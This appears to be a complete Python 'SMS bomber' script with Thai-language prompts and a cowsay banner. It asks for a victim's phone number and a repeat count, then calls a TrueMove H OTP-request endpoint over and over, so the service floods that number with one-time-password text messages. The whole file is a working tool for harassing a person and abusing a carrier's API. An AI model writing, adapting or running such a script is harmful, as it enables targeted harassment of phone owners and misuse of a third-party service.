import requests
import os 
import sys
import cowsay

os.system ("clear")
cowsay.dragon("ต้าร์มันหล่อ")
print ("FB:Samon ʚĩɞ")
print (" ")
love=input("เบอร์ไอควาย ")
ploy=int(input("จำนวนไอสัส "))
for po in range(ploy):
    requests.post ("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number":love,})
    print ("รักพิวจัง",po)